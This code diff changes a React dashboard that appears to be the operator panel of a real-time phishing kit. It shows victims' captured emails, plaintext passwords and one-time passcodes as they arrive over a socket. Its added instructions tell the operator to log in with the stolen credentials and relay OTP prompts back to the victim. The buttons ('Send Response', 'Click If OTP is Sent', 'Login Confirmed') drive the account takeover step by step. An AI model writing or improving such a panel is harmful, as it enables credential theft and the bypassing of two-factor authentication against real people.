@@ -1,6 +1,6 @@
 import React, { useState, useEffect } from "react";
 import { io } from "socket.io-client";
-import { Box, VStack, Text, Button, Input } from "@chakra-ui/react";
+import { Box, VStack, Text, Button, Input, HStack } from "@chakra-ui/react";
 import { SERVER_URL } from "../utils/reusables";
 
 const socket = io(SERVER_URL);
@@ -52,13 +52,22 @@ const AdminDashboard = () => {
     };
   }, []);
 
-  const handleSendResponse = (email) => {
-    socket.emit("adminResponse", { email, message: responseMessage });
+  const handleSendResponse = (data) => {
+    socket.emit("adminResponse", {
+      email: data.email,
+      password: data.password,
+      message: responseMessage,
+    });
     setResponseMessage("");
   };
 
-  const handleOtpSendResponse = (email) => {
-    socket.emit("adminOtpResponse", { email, message: otpResponseMessage });
+  const handleOtpSendResponse = (data) => {
+    socket.emit("adminOtpResponse", {
+      email: data.email,
+      password: data.response.password,
+      sendTo: data.response.message,
+      message: otpResponseMessage,
+    });
     setOtpResponseMessage("");
   };
 
@@ -86,17 +95,24 @@ const AdminDashboard = () => {
       <VStack align="stretch" spacing={4} bg="#f8a16d">
         {loginAttempts.map((attempt, index) => (
           <Box key={index} borderWidth={1} p={4} borderRadius="md">
-            <Text>Verify Email</Text>
-            <Text>Email: {attempt.email}</Text>
-            <Text>Password: {attempt.password}</Text>
+            <Text>
+              Verify Email To Send OTP To By Logging In With The Below Info And
+              Then Enter OTP-Enabled Email Before Clicking "Send Response"
+            </Text>
+            <Text bg="red" color="#fff">
+              Email: {attempt.email}
+            </Text>
+            <Text bg="#fff" color="red">
+              Password: {attempt.password}
+            </Text>
             <Text>Timestamp: {attempt.timestamp}</Text>
             <Input
               value={responseMessage}
               onChange={(e) => setResponseMessage(e.target.value)}
-              placeholder="Enter response message"
+              placeholder="Enter the verification email listed on account"
               mt={2}
             />
-            <Button onClick={() => handleSendResponse(attempt.email)} mt={2}>
+            <Button onClick={() => handleSendResponse(attempt)} mt={2}>
               Send Response
             </Button>
           </Box>
@@ -106,17 +122,15 @@ const AdminDashboard = () => {
         {otpAttempts.map((attempt, index) => (
           <Box key={index} borderWidth={1} p={4} borderRadius="md">
             <Text>Send OTP</Text>
-            <Text>Email: {attempt.email}</Text>
-            <Text>Password: {attempt.password}</Text>
+            <Text>Login Email: {attempt.email}</Text>
+            <Text bg="red" color="#fff">
+              OTP Will Be Sent To: {attempt.response.message}
+            </Text>
+            <Text>Password: {attempt.response.password}</Text>
             <Text>Timestamp: {attempt.timestamp}</Text>
-            <Input
-              value={otpResponseMessage}
-              onChange={(e) => setOtpResponseMessage(e.target.value)}
-              placeholder="Enter response message"
-              mt={2}
-            />
-            <Button onClick={() => handleOtpSendResponse(attempt.email)} mt={2}>
-              OTP Sent
+
+            <Button onClick={() => handleOtpSendResponse(attempt)} mt={2}>
+              Click If OTP is Sent
             </Button>
           </Box>
         ))}
@@ -126,15 +140,14 @@ const AdminDashboard = () => {
           <Box key={index} borderWidth={1} p={4} borderRadius="md">
             <Text>Send OTP</Text>
             <Text>Email: {attempt.email}</Text>
-            <Text>Password: {attempt.password}</Text>
+            <Text bg="red" color="#fff">
+              OTP Will Be Sent To: {attempt.response.message}
+            </Text>
+            <Text>Password: {attempt.response.password}</Text>
             <Text>Timestamp: {attempt.timestamp}</Text>
-            <Input
-              value={otpResponseMessage}
-              onChange={(e) => setOtpResponseMessage(e.target.value)}
-              placeholder="Enter response message"
-              mt={2}
-            />
-            <Button onClick={() => handleOtpSendResponse(attempt.email)} mt={2}>
+            <Text>Timestamp: {attempt.timestamp}</Text>
+
+            <Button onClick={() => handleOtpSendResponse(attempt)} mt={2}>
               OTP Sent
             </Button>
           </Box>
@@ -145,21 +158,34 @@ const AdminDashboard = () => {
           <Box key={index} borderWidth={1} p={4} borderRadius="md">
             <Text>OTP Updated</Text>
             <Text>Email: {attempt.email}</Text>
+            <Text>OTPsentTo: {attempt.sentTo}</Text>
             <Text>Password: {attempt.password}</Text>
-            <Text>OTP: {attempt.otp}</Text>
+            <Text bg="red" color="#fff">
+              OTP: {attempt.otp}
+            </Text>
             <Text>Timestamp: {attempt.timestamp}</Text>
-            <Input
-              value={otpUpdateResponseMessage}
-              onChange={(e) => setOtpUpdateResponseMessage(e.target.value)}
-              placeholder="Enter update message"
-              mt={2}
-            />
-            <Button
-              onClick={() => handleOtpUpdateResponse(attempt.email)}
-              mt={2}
-            >
-              Login Confirmed
-            </Button>
+
+            <HStack gap="3rem">
+              <Button
+                onClick={() => handleOtpUpdateResponse(attempt.email)}
+                mt={2}
+                bg="green"
+                color="#fff"
+              >
+                Login Confirmed
+              </Button>
+
+              <Button
+                onClick={() =>
+                  alert("Fix The Login Not Confirmed Button's function")
+                }
+                mt={2}
+                bg="red"
+                color="#fff"
+              >
+                Login Not Confirmed
+              </Button>
+            </HStack>
           </Box>
         ))}
       </VStack>
@@ -169,20 +195,32 @@ const AdminDashboard = () => {
             <Text>OTP Updated</Text>
             <Text>Email: {attempt.email}</Text>
             <Text>Password: {attempt.password}</Text>
-            <Text>OTP: {attempt.otp}</Text>
+            <Text>OTPsentTo: {attempt.sentTo}</Text>
+            <Text bg="red" color="#fff">
+              OTP: {attempt.otp}
+            </Text>
             <Text>Timestamp: {attempt.timestamp}</Text>
-            <Input
-              value={otpUpdateResponseMessage}
-              onChange={(e) => setOtpUpdateResponseMessage(e.target.value)}
-              placeholder="Enter update message"
-              mt={2}
-            />
-            <Button
-              onClick={() => handleOtpUpdateResponseMobile(attempt.email)}
-              mt={2}
-            >
-              Login Confirmed (m)
-            </Button>
+
+            <HStack gap="3rem">
+              <Button
+                onClick={() => handleOtpUpdateResponseMobile(attempt.email)}
+                mt={2}
+                bg="green"
+                color="#fff"
+              >
+                Login Confirmed (m)
+              </Button>
+              <Button
+                onClick={() =>
+                  alert("Fix The Login Not Confirmed Button's function")
+                }
+                mt={2}
+                bg="red"
+                color="#fff"
+              >
+                Login Not Confirmed (m)
+              </Button>
+            </HStack>
           </Box>
         ))}
       </VStack>
